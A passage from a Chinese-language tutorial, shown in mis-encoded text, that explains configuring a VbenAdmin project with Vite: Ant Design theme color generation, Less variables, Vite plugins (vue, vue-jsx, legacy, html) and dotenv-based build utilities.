±éŒ¯ï¼Œåªå¯«ã€‚é€™è¡Œä»£ç¢¼å¯ä»¥éš¨ä¾¿å¯«ï¼Œæ¯”å¦‚ï¼š\n1 2 3 // yiu: `red; @import (reference) \u0026#34;${resolve(\u0026#39;src/design/config.less\u0026#39;)}\u0026#34;;`, // â†“ è§£ææˆ,ä¸€æ¨£çš„æ•ˆæœã€‚ @yiu=red; @import (reference) \u0026#34;${resolve(\u0026#39;src/design/config.less\u0026#39;)}\u0026#34;;`, æˆ‘å€‹äººæ„Ÿè¦ºé€™å€‹hackå’Œcss hackå–®ç´”åå­—ä¸€æ¨£ã€‚è‡³æ–¼referenceï¼Œå¯ä»¥çœ‹ä¸€ä¸‹é—œæ–¼Less jsçš„@importå¯¦é©—é€™ç¯‡åšæ–‡å³å¯ç†è§£ã€‚åªæ˜¯æˆ‘å€‹äººç–‘æƒ‘ç‚ºä»€éº¼é€™å€‹importç‚ºä»€éº¼ä¸å¯«åœ¨globalVarsä¸­ã€‚\nViteçš„é¡è‰² èªªæ˜ è§£æbuild\\config\\themeConfig.tsæ–‡ä»¶ï¼Œç›´æ¥å‰µå»ºé€™å€‹æ–‡ä»¶ã€‚ç„¶å¾Œæˆ‘å€‘ä¸€æ®µä¸€æ®µçš„åˆ†æï¼š\n1 yarn add ant-design-vue@next ç¬¬ä¸€éƒ¨åˆ†3-16è¡Œä»£ç¢¼ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 // â†“ é»˜èªé¡è‰² export const primaryColor = \u0026#39;#0960bd\u0026#39;; // â†“ é»˜èªä¸»é¡Œ export const themeMode = \u0026#39;light\u0026#39;; // â†“ ä¸»é¡Œé¡å‹ export type ThemeMode = \u0026#39;dark\u0026#39; | \u0026#39;light\u0026#39;; // â†“ ä¸€å€‹è§£æ±ºè‡¨æ™‚æª¢æŸ¥çš„æ–¹æ³•é¡å‹ type Fn = (...arg: any) =\u0026gt; any; // â†“ Viteç”Ÿæˆé¡è‰²çµ„çš„æ–¹æ³•åƒæ•¸ï¼Œé¡è‰²é€™ä¸€å¡Šæœ‰é»æ·±å¥§äº†ï¼Œä¸åšç´°çš„ç ”ç©¶ï¼Œæ„Ÿèˆˆè¶£çš„åŒå­¸è‡ªå·±çœ‹çœ‹æºç¢¼å§ export interface GenerateColorsParams { mixLighten: Fn; mixDarken: Fn; tinycolor: any; color?: string; } ç¬¬äºŒéƒ¨åˆ†18-22è¡Œä»£ç¢¼ 1 2 3 4 5 6 7 import { generate } from \u0026#39;@ant-design/colors\u0026#39;; export function generateAntColors(color: string, mode: ThemeMode) { return generate(color, { theme: mode == \u0026#39;dark\u0026#39; ? \u0026#39;dark\u0026#39; : \u0026#39;default\u0026#39;, }); } èª¿ç”¨çš„@ant-design/colorsçš„é¡è‰²ç”Ÿæˆæ–¹æ³•ï¼Œå°‡åƒæ•¸ç°¡åŒ–äº†ä¸€ä¸‹ã€‚\nåƒè€ƒé€£çµï¼š\n@ant-design/colorsçš„npmé¦–é  Ant Design Colorsé¦–é  Ant Design è‰²æ¿ç”Ÿæˆç®—æ³•æ¼”é€²ä¹‹è·¯ ç¬¬ä¸‰éƒ¨åˆ†24-32è¡Œä»£ç¢¼ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 export function getThemeColors(color?: string, theme?: ThemeMode) { const tc = color || primaryColor; const tm = theme || themeMode; // â†“ å‚³å…¥çš„é¡è‰²æ ¹æ“šä¸»é¡Œç”Ÿæˆ10å€‹é¡è‰²ç³»åˆ— const colors = generateAntColors(tc, tm); // â†“ å–10å€‹é¡è‰²çš„ç¬¬6å€‹ä½œç‚ºä¸»é¡è‰² const primary = colors[5]; // â†“ å†ä½¿ç”¨ä¸»é¡è‰²æ ¹æ“šä¸»é¡Œç”Ÿæˆ10å€‹é¡è‰²ç³»åˆ— const modeColors = generateAntColors(primary, tm === \u0026#39;dark\u0026#39; ? \u0026#39;light\u0026#39; : \u0026#39;dark\u0026#39;); // â†“ è¼¸å‡ºé€™20å€‹é¡è‰² return [...colors, ...modeColors]; } ç¬¬å››éƒ¨åˆ†34-71è¡Œä»£ç¢¼ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 export function generateColors({ color = primaryColor, mixLighten, mixDarken, tinycolor, }: GenerateColorsParams) { const arr = new Array(19).fill(0); const lightens = arr.map((t, i) =\u0026gt; { return mixLighten(color, i / 5); }); const darkens = arr.map((t, i) =\u0026gt; { return mixDarken(color, i / 5); }); const alphaColors = arr.map((t, i) =\u0026gt; { return tinycolor(color) .setAlpha(i / 20) .toRgbString(); }); const tinycolorLightens = arr .map((t, i) =\u0026gt; { return tinycolor(color) .lighten(i * 5) .toHexString(); }) .filter((item) =\u0026gt; item !== \u0026#39;#ffffff\u0026#39;); const tinycolorDarkens = arr .map((t, i) =\u0026gt; { return tinycolor(color) .darken(i * 5) .toHexString(); }) .filter((item) =\u0026gt; item !== \u0026#39;#000000\u0026#39;); return [...lightens, ...darkens, ...alphaColors, ...tinycolorDarkens, ...tinycolorLightens]; } é€™è£¡ç›´æ¥æ ¹æ“šé¡è‰²ç”Ÿæˆäº†98ä¸­é¡è‰²ã€‚æˆ‘ç¢ºå¯¦ä¸å¤ªæ¸…æ¥šé€™å€‹éº¼å¤šé¡è‰²å¹¹ä»€éº¼çš„ã€‚èª¿ç”¨æ•ˆæœåƒè€ƒbuild\\vite\\plugin\\theme.tsï¼ˆç¾åœ¨å…ˆä¸ç®¡é€™å€‹æ–‡ä»¶ï¼‰ï¼š\nbuild/vite/plugin/theme.ts 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 /** * Vite plugin for website theme color switching * https://github.com/anncwb/vite-plugin-theme */ import { viteThemePlugin, mixLighten, mixDarken, tinycolor } from \u0026#39;vite-plugin-theme\u0026#39;; import { getThemeColors, generateColors } from \u0026#39;../../config/themeConfig\u0026#39;; export function configThemePlugin() { const colors = generateColors({ mixDarken, mixLighten, tinycolor, }); // ... } #0960bdç”Ÿæˆçš„é¡è‰²ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 console.log([...lightens, ...darkens, ...alphaColors, ...tinycolorDarkens, ...tinycolorLightens]); // â†“ è¼¸å‡º [ \u0026#39;#0960bd\u0026#39;, \u0026#39;#3a80ca\u0026#39;, \u0026#39;#6ba0d7\u0026#39;, \u0026#39;#9dbfe5\u0026#39;, \u0026#39;#cedff2\u0026#39;, \u0026#39;#ffffff\u0026#39;, \u0026#39;#13011f10c\u0026#39;, \u0026#39;#16113f119\u0026#39;, \u0026#39;#19315e127\u0026#39;, \u0026#39;#1c417e134\u0026#39;, \u0026#39;#1f519e141\u0026#39;, \u0026#39;#2261be14e\u0026#39;, \u0026#39;#2571de15b\u0026#39;, \u0026#39;#2891fd169\u0026#39;, \u0026#39;#2ba21d176\u0026#39;, \u0026#39;#2eb23d183\u0026#39;, \u0026#39;#31c25d190\u0026#39;, \u0026#39;#34d27d19d\u0026#39;, \u0026#39;#37f29c1ab\u0026#39;, \u0026#39;#0960bd\u0026#39;, \u0026#39;#074d97\u0026#39;, \u0026#39;#053a71\u0026#39;, \u0026#39;#04264c\u0026#39;, \u0026#39;#021326\u0026#39;, \u0026#39;#000000\u0026#39;, \u0026#39;#-2-13-26\u0026#39;, \u0026#39;#-4-26-4c\u0026#39;, \u0026#39;#-5-3a-71\u0026#39;, \u0026#39;#-7-4d-97\u0026#39;, \u0026#39;#-9-60-bd\u0026#39;, \u0026#39;#-b-73-e3\u0026#39;, \u0026#39;#-d-86-109\u0026#39;, \u0026#39;#-e-9a-12e\u0026#39;, \u0026#39;#-10-ad-154\u0026#39;, \u0026#39;#-12-c0-17a\u0026#39;, \u0026#39;#-14-d3-1a0\u0026#39;, \u0026#39;#-16-e6-1c6\u0026#39;, \u0026#39;#-17-fa-1eb\u0026#39;, \u0026#39;rgba(9, 96, 189, 0)\u0026#39;, \u0026#39;rgba(9, 96, 189, 0.05)\u0026#39;, \u0026#39;rgba(9, 96, 189, 0.1)\u0026#39;, \u0026#39;rgba(9, 96, 189, 0.15)\u0026#39;, \u0026#39;rgba(9, 96, 189, 0.2)\u0026#39;, \u0026#39;rgba(9, 96, 189, 0.25)\u0026#39;, \u0026#39;rgba(9, 96, 189, 0.3)\u0026#39;, \u0026#39;rgba(9, 96, 189, 0.35)\u0026#39;, \u0026#39;rgba(9, 96, 189, 0.4)\u0026#39;, \u0026#39;rgba(9, 96, 189, 0.45)\u0026#39;, \u0026#39;rgba(9, 96, 189, 0.5)\u0026#39;, \u0026#39;rgba(9, 96, 189, 0.55)\u0026#39;, \u0026#39;rgba(9, 96, 189, 0.6)\u0026#39;, \u0026#39;rgba(9, 96, 189, 0.65)\u0026#39;, \u0026#39;rgba(9, 96, 189, 0.7)\u0026#39;, \u0026#39;rgba(9, 96, 189, 0.75)\u0026#39;, \u0026#39;rgba(9, 96, 189, 0.8)\u0026#39;, \u0026#39;rgba(9, 96, 189, 0.85)\u0026#39;, \u0026#39;rgba(9, 96, 189, 0.9)\u0026#39;, \u0026#39;#0960bd\u0026#39;, \u0026#39;#0854a5\u0026#39;, \u0026#39;#07478c\u0026#39;, \u0026#39;#063b74\u0026#39;, \u0026#39;#042f5c\u0026#39;, \u0026#39;#032243\u0026#39;, \u0026#39;#02162b\u0026#39;, \u0026#39;#010913\u0026#39;, \u0026#39;#0960bd\u0026#39;, \u0026#39;#0a6cd5\u0026#39;, \u0026#39;#0b79ee\u0026#39;, \u0026#39;#1e86f4\u0026#39;, \u0026#39;#3793f5\u0026#39;, \u0026#39;#4fa0f7\u0026#39;, \u0026#39;#67adf8\u0026#39;, \u0026#39;#80baf9\u0026#39;, \u0026#39;#98c7fa\u0026#39;, \u0026#39;#b0d4fb\u0026#39;, \u0026#39;#c9e2fc\u0026#39;, \u0026#39;#e1effe\u0026#39;, \u0026#39;#f9fcff\u0026#39; ] console.log( [...lightens, ...darkens, ...alphaColors, ...tinycolorDarkens, ...tinycolorLightens].length ); // â†“ è¼¸å‡º 78 ç¬¬äº”éƒ¨åˆ†73-104è¡Œä»£ç¢¼ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 /** * less global variable */ export function generateModifyVars() { const palettes = generateAntColors(primaryColor, themeMode); const primary = palettes[5]; const primaryColorObj: Record\u0026lt;string, string\u0026gt; = {}; for (let index = 0; index \u0026lt; 10; index++) { primaryColorObj[`primary-${index + 1}`] = palettes[index]; } return { \u0026#39;primary-color\u0026#39;: primary, ...primaryColorObj, \u0026#39;info-color\u0026#39;: primary, \u0026#39;processing-color\u0026#39;: primary, \u0026#39;success-color\u0026#39;: \u0026#39;#55D187\u0026#39;, // Success color \u0026#39;error-color\u0026#39;: \u0026#39;#ED6F6F\u0026#39;, // False color \u0026#39;warning-color\u0026#39;: \u0026#39;#EFBD47\u0026#39;, // Warning color \u0026#39;disabled-color\u0026#39;: \u0026#39;rgba(0, 0, 0, 0.25)\u0026#39;, // Failure color \u0026#39;heading-color\u0026#39;: \u0026#39;rgba(0, 0, 0, 0.85)\u0026#39;, // Title color \u0026#39;text-color\u0026#39;: \u0026#39;rgba(0, 0, 0, 0.85)\u0026#39;, // Main text color \u0026#39;text-color-secondary\u0026#39;: \u0026#39;rgba(0, 0, 0, 0.45)\u0026#39;, // Subtext color \u0026#39;font-size-base\u0026#39;: \u0026#39;14px\u0026#39;, // Main font size \u0026#39;box-shadow-base\u0026#39;: \u0026#39;0 2px 8px rgba(0, 0, 0, 0.15)\u0026#39;, // Floating shadow \u0026#39;border-color-base\u0026#39;: \u0026#39;#d9d9d9\u0026#39;, // Border color, \u0026#39;border-radius-base\u0026#39;: \u0026#39;2px\u0026#39;, // Component/float fillet \u0026#39;link-color\u0026#39;: primary, // Link color }; } é€™å€‹æ–¹æ³•å°±æ˜¯ç”Ÿæˆantdä¸»é¡Œè®Šé‡å°è±¡çš„ã€‚å°‡è©²å°è±¡çš„çµæœæ”¾åˆ°Viteçš„lessé…ç½®ä¸­ï¼š\nvite.config.ts 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 // ... import { generateModifyVars } from \u0026#39;./build/config/themeConfig\u0026#39;; // ... export default ({ command, mode }: ConfigEnv): UserConfig =\u0026gt; { // ... return { // ... css: { preprocessorOptions: { less: { modifyVars: { // ... ...generateModifyVars(), }, // ... }, }, }, // ... }; }; Viteé…ç½®-plugin èªªæ˜ Viteé…ç½®-pluginèªªæ˜\nå®˜ç¶²åŸæ–‡ï¼š\né¡å‹ï¼š 1 (Plugin | Plugin[])[] å°‡è¦ç”¨åˆ°çš„æ’ä»¶æ•¸çµ„ã€‚æŸ¥çœ‹ æ’ä»¶ API ç²å– Vite æ’ä»¶çš„æ›´å¤šç´°ç¯€ã€‚\né…ç½®æ’ä»¶ å®ƒæ¥æ”¶ä¸€å€‹æ’ä»¶å°è±¡ï¼Œæˆ–è€…ä¸€å€‹æ’ä»¶æ•¸çµ„ã€‚ç”±æ–¼æˆ‘å€‘éœ€è¦é…ç½®å¾ˆå¤šæ’ä»¶ï¼Œè€Œæ¯ä¸€å€‹æ’ä»¶çš„é…ç½®ä¹Ÿä¸ä¸€æ¨£ï¼Œæ‰€ä»¥æˆ‘å€‘æŠŠæ’ä»¶æ•¸çµ„å°è£åˆ°ä¸€å€‹æ–¹æ³•ä¸­å»ã€‚çµ±ä¸€é…ç½®VbenAdminçš„æ’ä»¶ã€‚\nå‰µå»ºç”Ÿæˆæ’ä»¶æ•¸çµ„æ–¹æ³• build/vite/plugin/index.ts 1 2 3 4 5 6 7 8 9 import type { Plugin } from \u0026#39;vite\u0026#39;; import type { ViteEnv } from \u0026#39;../../utils\u0026#39;; export function createVitePlugins(viteEnv: ViteEnv, isBuild: boolean) { const { VITE_USE_IMAGEMIN, VITE_USE_MOCK, VITE_LEGACY, VITE_BUILD_COMPRESS } = viteEnv; const vitePlugins: (Plugin | Plugin[])[] = []; return vitePlugins; } å¾ŒçºŒé…ç½®vitePluginsé€™å€‹æ•¸çµ„ã€‚\né…ç½®Viteæ’ä»¶ vite.config.ts 1 2 3 4 5 6 7 8 9 10 11 12 13 // ... import { createVitePlugins } from \u0026#39;./build/vite/plugin\u0026#39;; // ... export default ({ command, mode }: ConfigEnv): UserConfig =\u0026gt; { // ... return { // ... // é …ç›®ä½¿ç”¨çš„viteæ’ä»¶ã€‚æ•¸é‡å¤§ï¼Œå–®ç¨æå–ç®¡ç† plugins: createVitePlugins(viteEnv, isBuild), // ... }; }; Viteæ’ä»¶-@vitejs-plugin-vue èªªæ˜ @vitejs/plugin-vueçš„npmé¦–é \nè¦ç·¨å¯«Vueç¨‹åºï¼Œé€™å€‹ä¸ç”¨è§£é‡‹äº†å§ï¼Œåœ¨ä½¿ç”¨Viteå‰µå»ºæ‡‰ç”¨ç¨‹åºçš„æ™‚å€™ï¼Œé€™å€‹ä¾è³´å°±å·²ç¶“é»˜èªåŠ ä¸Šäº†ã€‚\nå¼•å…¥çµ„ä»¶ vueæ’ä»¶ä¸ç”¨é…ç½®ï¼Œå¯ä»¥ç›´æ¥æ”¾é€²å»ã€‚\nbuild/vite/plugin/index.ts 1 2 3 4 5 6 7 8 9 // ... import vue from \u0026#39;@vitejs/plugin-vue\u0026#39;; // ... export function createVitePlugins(viteEnv: ViteEnv, isBuild: boolean) { // ... const vitePlugins: (Plugin | Plugin[])[] = [vue()]; // ... return vitePlugins; } Viteæ’ä»¶-@vitejs-plugin-vue-jsx èªªæ˜ ç‚ºä»€éº¼ä½¿ç”¨JSXï¼Ÿ\nå…¶å¯¦JSXçš„æ•ˆæœå’Œæˆ‘å€‘åœ¨vueçš„templateä¸­å¯«çš„ä»£ç¢¼æ•ˆæœæ˜¯ä¸€æ¨£çš„ã€‚æœ€çµ‚éƒ½æœƒè¢«æ¸²æŸ“æˆcreateElementã€‚ å€åˆ¥æ˜¯templateçš„æ¨™ç±¤æ˜¯ä¸å¯è®Šçš„ï¼Œæˆ‘å€‘è¦å¯¦ç¾å‹•æ…‹æ¨™ç±¤ï¼Œåªèƒ½ä½¿ç”¨v-ifã€‚è€ŒJSXçš„æœ€å¤§ç‰¹é»å°±æ˜¯éˆæ´»ï¼Œæˆ‘å€‘å¯ä»¥éš¨æ„çµ„è£HTMLä»£ç¢¼ã€‚ å‡å¦‚æˆ‘å€‘è¦å¯¦ç¾ä¸€å€‹çµ„ä»¶æ¸²æŸ“\u0026lt;hn\u0026gt;\u0026lt;/hn\u0026gt;æ¨™ç±¤ï¼Œnæ˜¯æˆ‘å€‘å‚³å…¥çš„åƒæ•¸ã€‚å¦‚æœç”¨templateï¼Œé‚£éº¼æˆ‘å€‘è¦å¯«6å€‹v-ifã€‚ä½†æ˜¯å¦‚æœä½¿ç”¨JSXï¼Œæˆ‘å€‘å°±å¯ä»¥ç›´æ¥å°‡næ”¾åˆ°æ¨™ç±¤ä¸­å»ã€‚\nåƒè€ƒé€£çµ @vitejs/plugin-vue-jsxçš„npmé¦–é  Vue-JSX Vue- JSX ä¸­çš„ç”¨æ³• Vue-setupä¸­ä½¿ç”¨JSX Vue-æ¨¡æ¿èªæ³• å®‰è£ 1 yarn add @vitejs/plugin-vue-jsx --dev vue-jsxæ’ä»¶ä¸ç”¨é…ç½®ï¼Œå¯ä»¥ç›´æ¥æ”¾é€²å»ã€‚\nbuild/vite/plugin/index.ts 1 2 3 4 5 6 7 8 9 // ... import vueJsx from \u0026#39;@vitejs/plugin-vue-jsx\u0026#39;; // ... export function createVitePlugins(viteEnv: ViteEnv, isBuild: boolean) { // ... const vitePlugins: (Plugin | Plugin[])[] = [vue(),vueJsx()]; // ... return vitePlugins; } Viteæ’ä»¶-@vitejs-plugin-legacy èªªæ˜ åŸæ–‡æè¿°ï¼š\næ³¨ï¼šæ­¤æ’ä»¶éœ€è¦vite@^2.0.0-beta.12ã€‚\nViteé»˜èªçš„ç€è¦½å™¨æ”¯æŒåŸºç·šæ˜¯åŸç”ŸESMã€‚æœ¬æ’ä»¶ç‚ºä¸æ”¯æŒåŸç”ŸESMçš„å‚³çµ±ç€è¦½å™¨æä¾›æ”¯æŒã€‚\né»˜èªæƒ…æ³ä¸‹ï¼Œè©²æ’ä»¶å°‡ç‚ºæœ€çµ‚bundleä¸­çš„æ¯å€‹chunkç”Ÿæˆä¸€å€‹ç›¸æ‡‰çš„legacy chunkï¼Œç”¨@babel/reset-envé€²è¡Œè½‰æ›ï¼Œä¸¦ä»¥SystemJSæ¨¡å¡Šçš„å½¢å¼ç™¼å¸ƒï¼ˆä»ç„¶æ”¯æŒä»£ç¢¼åˆ†å‰²ï¼ï¼‰ã€‚\nç”Ÿæˆä¸€å€‹åŒ…å«SystemJSé‹è¡Œæ™‚çš„polyfill chunkï¼Œä»¥åŠç”±æŒ‡å®šçš„ç€è¦½å™¨ç›®æ¨™å’Œæ†ç¶åŒ…ä¸­çš„å¯¦éš›ä½¿ç”¨æƒ…æ³æ±ºå®šçš„ä»»ä½•å¿…è¦çš„polyfillsã€‚\nåœ¨ç”Ÿæˆçš„HTMLä¸­è¨»å…¥\u0026lt;script nomodule\u0026gt;æ¨™ç±¤ï¼Œä»¥ä¾¿åœ¨æ²’æœ‰æœ¬åœ°ESMæ”¯æŒçš„ç€è¦½å™¨ä¸­æœ‰æ¢ä»¶åœ°åŠ è¼‰polyfillså’Œlegacy bundleã€‚\næ³¨å…¥ import.meta.env.LEGACY env è®Šé‡ï¼Œè©²è®Šé‡åƒ…åœ¨ legacy ç”Ÿç”¢æ§‹å»ºä¸­ç‚ºçœŸï¼Œè€Œåœ¨æ‰€æœ‰å…¶ä»–æƒ…æ³ä¸‹ç‚ºå‡ã€‚(éœ€è¦vite@^2.0.0-beta.69)ã€‚\næ‰€ä»¥é€™å€‹æ˜¯ä¸€å€‹ç€è¦½å™¨å…¼å®¹çš„æ’ä»¶ã€‚æˆ‘å€‘ç›´æ¥å®‰è£ä½¿ç”¨ï¼Œå€‹äººæ„Ÿè¦ºå­¸ç¿’çš„è©±ä¹Ÿç”¨ä¸ä¸Šã€‚\nåƒè€ƒé€£çµ @vitejs/plugin-legacyçš„npmé¦–é  å®‰è£ 1 yarn add @vitejs/plugin-legacy --dev VbenAdminé…ç½®build/vite/plugin/index.tsï¼š build/vite/plugin/index.ts 1 2 3 4 5 6 7 8 9 10 // ... import legacy from \u0026#39;@vitejs/plugin-legacy\u0026#39;; // ... export function createVitePlugins(viteEnv: ViteEnv, isBuild: boolean) { // ... // @vitejs/plugin-legacy VITE_LEGACY \u0026amp;\u0026amp; isBuild \u0026amp;\u0026amp; vitePlugins.push(legacy()); // ... return vitePlugins; } Viteæ’ä»¶-vite-plugin-html èªªæ˜ åŸæ–‡æè¿°ï¼š\nä¸€å€‹ç‚ºindex.htmlæä¾›minifyå’ŒåŸºæ–¼EJSæ¨¡æ¿åŠŸèƒ½çš„Viteæ’ä»¶ã€‚\nminifyï¼šå£“ç¸®index.htmlä»£ç¢¼ã€‚ EJSï¼šçµ¦index.htmlæä¾›è¨ªå•è®Šé‡çš„èƒ½åŠ›ã€‚ åƒè€ƒé€£çµ vite-plugin-htmlçš„npmé¦–é  å®‰è£ 1 yarn add vite-plugin-html --dev å‰µå»ºé…ç½®æ–‡ä»¶ build/vite/plugin/html.ts 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 /** * Plugin to minimize and use ejs template syntax in index.html. * https://github.com/anncwb/vite-plugin-html */ import type { Plugin } from \u0026#39;vite\u0026#39;; import type { ViteEnv } from \u0026#39;../../utils\u0026#39;; import html from \u0026#39;vite-plugin-html\u0026#39;; import pkg from \u0026#39;../../../package.json\u0026#39;; import { GLOB_CONFIG_FILE_NAME } from \u0026#39;../../constant\u0026#39;; export function configHtmlPlugin(env: ViteEnv, isBuild: boolean) { const { VITE_GLOB_APP_TITLE, VITE_PUBLIC_PATH } = env; // â†“ é€™é‡Œå¾ŒçºŒç« å‹•æ…‹é…ç½®è¬›è§£ // const path = VITE_PUBLIC_PATH.endsWith(\u0026#39;/\u0026#39;) ? VITE_PUBLIC_PATH : `${VITE_PUBLIC_PATH}/`; // const getAppConfigSrc = () =\u0026gt; { // return `${path || \u0026#39;/\u0026#39;}${GLOB_CONFIG_FILE_NAME}?v=${pkg.version}-${new Date().getTime()}`; // }; const htmlPlugin: Plugin[] = html({ minify: isBuild, inject: { // Inject data into ejs template injectData: { title: VITE_GLOB_APP_TITLE, }, // â†“ é€™é‡Œå¾ŒçºŒç« å‹•æ…‹é…ç½®è¬›è§£ // tags: isBuild // ? [ // { // tag: \u0026#39;script\u0026#39;, // attrs: { // src: getAppConfigSrc(), // }, // }, // ] // : [], }, }); return htmlPlugin; } é…ç½®Viteæ’ä»¶ build/vite/plugin/index.ts 1 2 3 4 5 6 7 8 9 // ... import { configHtmlPlugin } from \u0026#39;./html\u0026#39;; export function createVitePlugins(viteEnv: ViteEnv, isBuild: boolean) { // ... // vite-plugin-html vitePlugins.push(configHtmlPlugin(viteEnv, isBuild)); // ... } è£œå…… åšå®Œæœ¬ç« æ“ä½œä¹‹å¾Œï¼Œæˆ‘çªç„¶ç™¼ç¾é …ç›®ä¸èƒ½ç·¨è­¯äº†ã€‚\nç¸½æ˜¯å ±package.jsonæ‰¾ä¸åˆ°ã€‚æˆ‘çœ‹äº†ä¸€ä¸‹ä»£ç¢¼ï¼Œä¸»è¦å°±æ˜¯build\\vite\\plugin\\html.tsä¸­çš„å°å…¥ç„¡æ³•æ‰¾åˆ°ã€‚\næˆ‘åå¾©å°æ¯”äº†ä¸€ä¸‹VbenAdminçš„æºç¢¼ã€‚ä¹Ÿæ²’æœ‰ç™¼ç¾æœ‰ä»€éº¼ä¸åŒçš„åœ°æ–¹ã€‚\nç„¶å¾Œæˆ‘åˆè©¦äº†ä¸€ä¸‹ï¼Œç•¶åŸ·è¡Œviteå‘½ä»¤çš„æ™‚å€™ï¼Œbuildæ–‡ä»¶å¤¾ä¸‹å§‹çµ‚ä¸èƒ½è¨ªå•package.jsonã€‚ä½†æ˜¯srcå’Œvite.config.tsä¸­éƒ½å¯ä»¥å°å…¥è¨ªå•ã€‚\né‚£éº¼é€™è£¡æœ‰å…©ç¨®è¬›è§£æ–¹æ¡ˆï¼š\nå»æ‰å°å…¥ é€™è£¡çš„å°å…¥åªæ˜¯æˆ‘å€‘åœ¨ä½¿ç”¨_app.config.jsçš„æ™‚å€™åŠ ä¸Šä¸€å€‹ç‰ˆæœ¬ä¿¡æ¯ã€‚å¯ä»¥è®“æˆ‘å€‘çŸ¥é“é€™å€‹é …ç›®æ˜¯å¤šä¹…æ‰“åŒ…çš„ï¼Œæ‰“åŒ…çš„æ™‚å€™ç‰ˆæœ¬æ˜¯å¤šå°‘ã€‚æ‰€ä»¥å»æ‰ä¹Ÿç„¡å¦¨ï¼Œ_app.config.jsé‚„æ˜¯ä¸€æ¨£å¯ä»¥è¨ªå•çš„ã€‚\nå¾vite.config.tsä¸­å‚³åƒä¸‹å» æˆ‘ä½¿ç”¨äº†é€™å€‹æ–¹æ¡ˆï¼Œå› ç‚ºè¬ä¸€buildæ–‡ä»¶å¤¾å…¶ä»–åœ°æ–¹è¦ç”¨package.jsonå‘¢ã€‚ä¸éç”¨çš„åœ°æ–¹æ‡‰è©²ä¹Ÿå¾ˆå°‘å§ã€‚\nä¿®æ”¹vite.config.tsï¼š\nvite.config.ts 1 2 3 4 5 6 7 8 9 10 11 12 13 // ... import pkg from \u0026#39;./package.json\u0026#39;; // ... export default ({ command, mode }: ConfigEnv): UserConfig =\u0026gt; { // ... return { // ... // The vite plugin used by the project. The quantity is large, so it is separately extracted and managed plugins: createVitePlugins(viteEnv, isBuild, pkg), // ... }; }; ä¿®æ”¹build/vite/plugin/index.tsï¼š\nbuild/vite/plugin/index.ts 1 2 3 4 5 6 7 // ... export function createVitePlugins(viteEnv: ViteEnv, isBuild: boolean, pkg: any) { // ... vitePlugins.push(configHtmlPlugin(viteEnv, isBuild, pkg)); return vitePlugins; } ä¿®æ”¹build/vite/plugin/html.tsï¼š\nbuild/vite/plugin/html.ts 1 2 3 4 5 6 7 8 9 10 11 // ... import html from \u0026#39;vite-plugin-html\u0026#39;; export function configHtmlPlugin(env: ViteEnv, isBuild: boolean, pkg: any) { // ... const getAppConfigSrc = () =\u0026gt; { return `${path || \u0026#39;/\u0026#39;}${GLOB_CONFIG_FILE_NAME}?v=${pkg.version}-${new Date().getTime()}`; }; // ... return htmlPlugin; } å®Œå–„buildçš„utils.ts èªªæ˜ å®Œå–„build\\utils.tsæ–‡ä»¶ã€‚\nç¬¬ä¸€éƒ¨åˆ† é™¤äº†é€™å€‹processï¼Œæ‡‰è©²ä¹Ÿæ²’æœ‰è¦è§£é‡‹çš„å§ã€‚\nNodeä¸­æ–‡æ–‡æª”-process\nbuild/utils.ts 1 2 3 4 5 6 7 8 9 10 11 12 13 14 export function isDevFn(mode: string): boolean { return mode === \u0026#39;development\u0026#39;; } export function isProdFn(mode: string): boolean { return mode === \u0026#39;production\u0026#39;; } /** * Whether to generate package preview */ export function isReportMode(): boolean { return process.env.REPORT === \u0026#39;true\u0026#39;; } å®‰è£dotenv dotenvä¾è³´çš„ä½œç”¨ï¼šå¾.evnæ–‡ä»¶æµBufferä¸­è®€å–å±¬æ€§è¼¸å‡ºä¸€å€‹å°è±¡ã€‚\né‚£éº¼å’Œæˆ‘å€‘ä¹‹å‰çš„åŠ è¼‰ç’°å¢ƒè®Šé‡çš„å€åˆ¥ï¼š\nViteçš„loadEnv()ï¼šé€™å€‹æ–¹æ³•Viteçš„å®˜ç¶²ä¸Šè²Œä¼¼æ²’æœ‰é–‹æ”¾ï¼Œè€Œä¸”ç²å–çš„æ–‡ä»¶æ˜¯æŒ‡å®šçš„ï¼Œç²å–çš„å°è±¡éœ€è¦æˆ‘å€‘è‡ªå·±æ ¼å¼åŒ–ä¸€ä¸‹ã€‚ Vbençš„wrapperEnv()ï¼šé€™æ˜¯ä¸€å€‹æ ¼å¼åŒ–ç’°å¢ƒè®Šé‡çš„æ–¹æ³•ã€‚ dotenvï¼šæ˜¯ä¸€å€‹ä¾è³´ï¼Œå…¶åŠŸèƒ½ä¸åƒ…åƒ…æ˜¯ç²å–ç’°å¢ƒè®Šé‡ï¼Œç•¶ç„¶æˆ‘å€‘ç›®å‰åªç”¨å®ƒä¾†ç²å–æŒ‡å®šçš„.envæ–‡ä»¶ã€‚ dotenvçš„npmé¦–é \n1 yarn add dotenv --dev ç¬¬äºŒéƒ¨åˆ† Nodeä¸­æ–‡æ–‡æª”-fs Nodeä¸­æ–‡æ–‡æª”-path dotenvçš„npmé¦–é  build/utils.ts 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 import fs from \u0026#39;fs\u0026#39;; import path from \u0026#39;path\u0026#39;; import dotenv from \u0026#39;dotenv\u0026#39;; /** * Get the environment variables starting with the specified prefix * @param match prefix * @param confFiles ext */ export function getEnvConfig(match = \u0026#39;VITE_GLOB_\u0026#39;, confFiles = [\u0026#39;.env\u0026#39;, \u0026#39;.env.production\u0026#39;]) { let envConfig = {}; // â†“ å¾ªç’°æ–‡ä»¶å confFiles.forEach((item) =\u0026gt; { try { // â†“ åŒæ­¥è®€å–æ 